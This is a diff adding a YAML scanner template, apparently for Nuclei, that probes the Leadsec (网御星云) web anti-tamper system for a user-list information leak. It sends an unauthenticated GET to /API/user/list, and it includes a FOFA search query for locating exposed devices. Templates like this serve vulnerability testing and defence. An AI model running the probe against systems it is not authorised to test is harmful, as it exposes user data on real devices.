@@ -1,0 +1,27 @@
+id: poc-lg6g6sz5cgmonvxt
+info:
+  name: 网御星云网页防篡改系统list存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lg6g6sz5cgmonvxt'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lg6g6sz5cgmonvxt
+    fofa: title="网御安全网关"
+http:
+- raw:
+  - 'GET /API/user/list HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2159.60 Safari/537.36
+
+    Accept: */*
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
